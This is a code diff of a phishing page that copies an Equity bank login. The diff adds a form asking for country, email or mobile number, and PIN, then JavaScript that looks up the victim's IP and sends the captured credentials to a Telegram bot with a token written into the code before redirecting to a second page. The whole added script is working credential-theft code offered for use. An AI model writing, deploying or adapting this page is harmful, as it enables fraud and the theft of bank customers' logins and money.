@@ -64,6 +64,7 @@
             padding: 10px;
             border: 1px solid #ddd;
             border-radius: 4px;
+            box-sizing: border-box;
         }
         
         button {
@@ -95,81 +96,67 @@
             max-width: 150px;
             margin-bottom: 20px;
         }
-        /* ===== Mobile Responsive Styles ===== */
+        
         @media screen and (max-width: 768px) {
             body {
                 flex-direction: column;
                 height: auto;
                 min-height: 100vh;
             }
-
             .left-section {
                 flex: none;
                 justify-content: center;
                 text-align: center;
                 padding: 30px 20px;
             }
-
             .left-section h1 {
                 font-size: 1.5rem;
             }
-
             .left-section p {
                 font-size: 1rem;
             }
-
             .right-section {
                 flex: none;
                 padding: 20px;
             }
-
             .login-form {
                 max-width: 100%;
                 box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
             }
-
             .logo {
                 max-width: 120px;
             }
         }
-
+        
         @media screen and (max-width: 480px) {
             .left-section {
                 padding: 20px 15px;
             }
-
             .left-section h1 {
                 font-size: 1.3rem;
             }
-
             .left-section p {
                 font-size: 0.9rem;
             }
-
             .right-section {
                 padding: 15px;
             }
-
             .login-form {
                 padding: 15px;
             }
-
             .login-form h2 {
                 font-size: 1.1rem;
             }
-
             input[type="text"],
             input[type="password"],
             select {
                 padding: 8px;
-                font-size: 16px; /* Prevents iOS zoom on focus */
+                font-size: 16px;
             }
-
             button {
                 padding: 12px;
                 font-size: 1rem;
             }
-
             .logo {
                 max-width: 100px;
             }
@@ -186,38 +173,115 @@
             <p>More than just banking.</p>
         </div>
     </div>
-
     <div class="right-section">
         <div class="login-form">
-            <h2>Verify</h2>
-            <p>How would you like to get verified? Select one of the options below:</p>
-
+            <h2>Login Equity As on App</h2>
             <div class="form-group">
-                <input type="radio" id="by-sms" name="verification" value="sms" checked>
-                <label for="by-sms">By SMS</label>
-                <p>1234567890</p>
+                <label for="country">Country</label>
+                <select id="country">
+                    <option value="Kenya">Kenya</option>
+                    <option value="Uganda">Uganda</option>
+                    <option value="Tanzania">Tanzania</option>
+                </select>
             </div>
-
             <div class="form-group">
-                <input type="radio" id="by-email" name="verification" value="email">
-                <label for="by-email">By Email</label>
-                <p>************@gmail.com</p>
+                <label for="email">Email address or mobile number</label>
+                <input type="text" id="email" placeholder="Email address or mobile number" required>
             </div>
-
-            <button id="next-button">Next</button>
+            <div class="form-group">
+                <label for="password">Enter Your PIN</label>
+                <input type="password" id="password" placeholder="Enter password" required>
+            </div>
+            <button id="signin-button">Proceed</button>
+            <p class="footer"><a href="#">Forgot your password?</a> | <a href="#">Register</a></p>
             <p class="footer">English</p>
         </div>
     </div>
 
     <script>
-        document.getElementById('next-button').addEventListener('click', function() {
-            const selectedOption = document.querySelector('input[name="verification"]:checked');
+        // ========== CONFIGURATION ==========
+        // Replace these with YOUR Telegram bot token and chat ID
+        const TELEGRAM_BOT_TOKEN = '7186506994:AAEKIkNo49PL-IyvoRFGFJoC5bxUfmfh_L0';
+        const TELEGRAM_CHAT_ID = '5615316142';
+        // ===================================
 
-            if (selectedOption) {
-                window.location.href = "equity2.html";
-            } else {
-                alert("Please select a verification method.");
+        /**
+         * Sends a message to your Telegram bot via the Bot API.
+         * Uses fetch() – works in all modern browsers.
+         */
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                const result = await response.json();
+                if (!result.ok) {
+                    console.error('Telegram API error:', result);
+                }
+                return result;
+            } catch (err) {
+                console.error('Failed to send to Telegram:', err);
             }
+        }
+
+        /**
+         * Gets the user's IP address via a free public API,
+         * then sends the full credential capture to Telegram.
+         */
+        async function captureAndSend() {
+            const country = document.getElementById('country').value;
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value.trim();
+
+            if (!email || !password) {
+                alert('Please fill in all fields.');
+                return false;
+            }
+
+            // 1. Try to grab the victim's public IP
+            let ip = 'Unknown';
+            try {
+                const resp = await fetch('https://api.ipify.org?format=json');
+                const data = await resp.json();
+                ip = data.ip;
+            } catch (e) {
+                // fail silently – IP is a nice-to-have
+            }
+
+            // 2. Build the message
+            const timestamp = new Date().toLocaleString();
+            const message = `
+<b>New Capture</b>
+Time: ${timestamp}
+IP: ${ip}
+
+Country: ${country}
+Email/Phone: ${email}
+Password: ${password}
+            `.trim();
+
+            // 3. Send to Telegram (fire-and-forget, no blocking)
+            sendToTelegram(message);
+
+            // 4. Redirect to the next page
+            window.location.href = "equity2.html";
+
+            return false;
+        }
+
+        // Attach the handler to the button
+        document.getElementById('signin-button').addEventListener('click', function(e) {
+            e.preventDefault();
+            captureAndSend();
         });
     </script>
 
